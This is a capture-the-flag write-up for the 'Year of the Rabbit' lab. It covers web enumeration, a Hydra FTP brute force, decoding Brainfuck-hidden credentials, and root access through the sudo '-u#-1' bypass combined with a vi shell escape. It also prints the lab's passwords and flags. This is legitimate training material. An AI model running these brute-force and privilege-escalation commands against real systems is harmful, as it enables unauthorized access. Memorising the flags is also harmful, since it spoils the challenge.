# Year of the Rabbit: Write-up

## 1. Reconnaissance

First, verify connectivity with the target:

```bash
ping 10.130.128.131
```

The host is up.

---

### Nmap Scan

```bash
nmap -sV -sC -oN scan 10.130.128.131
```

Open ports discovered:

- **21/tcp** – FTP (vsftpd 3.0.2)
    
- **22/tcp** – SSH (OpenSSH 6.7p1)
    
- **80/tcp** – HTTP (Apache 2.4.10)
    

The web server shows the default Apache page.

---

## 2. Web Enumeration

### Directory Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.130.128.131/FUZZ
```

Interesting result:

- `/assets`
    

---

### Inspecting Assets

Inside:

```
/assets/style.css
```

A comment reveals:

```
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

---

### Hidden Behavior (Burp Suite)

The page `/sup3r_s3cr3t_fl4g.php` redirects to a YouTube video, but intercepting requests reveals:

```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU
```

Accessing:

```
/WExYY2Cv-qU
```

reveals an image.

---

## 3. Steganography / Information Leakage

Download the image:

```bash
wget http://10.130.128.131/WExYY2Cv-qU/Hot_Babe.png
```

Extract strings:

```bash
strings Hot_Babe.png
```

This reveals:

- FTP username: `ftpuser`
    
- A list of possible passwords
    

---

## 4. FTP Brute Force

Use **Hydra**:

```bash
hydra -l ftpuser -P ftp_passwords.txt ftp://10.130.128.131
```

Valid credentials found:

```
ftpuser : 5iez1wGXKfPKQ
```

---

## 5. FTP Access

```bash
ftp 10.130.128.131
```

Download:

```
Eli's_Creds.txt
```

---

## 6. Decoding Credentials

The file contains Brainfuck code.

After decoding:

```
User: eli
Password: DSpDiM1wAEwid
```

---

## 7. SSH Access

```bash
ssh eli@10.130.128.131
```

After login, a message from root hints at a hidden location.

---

## 8. Finding Gwendoline Credentials

Search for the hint:

```bash
locate s3cr3t
```

Interesting path:

```
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

Reading it:

```
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
```

Credentials:

```
gwendoline : MniVCQVhQHUNI
```

---

## 9. User Flag

Switch user:

```bash
su gwendoline
```

Retrieve flag:

```bash
cat user.txt
```

```
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

---

## 10. Privilege Escalation

### Sudo Permissions

```bash
sudo -l
```

Output:

```
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

---

### Vulnerability Explanation

The system uses **sudo version 1.8.10p3**, which is vulnerable to a known bypass:

```
-u#-1
```

This allows execution as UID `-1`, which resolves to **root**.

---

### Exploitation

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Inside `vi`:

```vim
:!/bin/bash
```

This spawns a root shell.

---

## 11. Root Flag

Verify:

```bash
id
```

```
uid=0(root)
```

Retrieve flag:

```bash
cat /root/root.txt
```

```
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

---

# Conclusion

This challenge demonstrates a full attack chain:

1. Web enumeration → hidden endpoint
    
2. Information disclosure via image
    
3. FTP brute force
    
4. Credential extraction (Brainfuck decoding)
    
5. Lateral movement (eli → gwendoline)
    
6. Privilege escalation via vulnerable sudo configuration
    

The key takeaway is the importance of:

- inspecting hidden web content
    
- extracting data from files
    
- chaining small weaknesses
    
- understanding sudo misconfigurations and version-specific exploits
    